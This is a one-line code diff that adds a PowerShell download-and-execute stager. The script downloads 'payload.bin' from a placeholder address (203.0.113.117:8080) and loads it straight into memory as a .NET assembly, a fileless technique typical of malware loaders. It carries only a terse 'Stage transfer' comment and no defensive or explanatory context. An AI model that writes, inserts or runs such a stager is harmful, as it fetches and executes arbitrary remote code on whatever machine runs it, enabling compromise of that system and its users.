@@ -1,0 +1,1 @@
+<# Stage transfer #> try { $StageBytes = (New-Object System.Net.WebClient).DownloadData("http://203.0.113.117:8080/payload.bin"); [Reflection.Assembly]::Load($StageBytes); Write-Output "stage 13 initialized" } catch { Write-Warning "Stage transfer failed" }
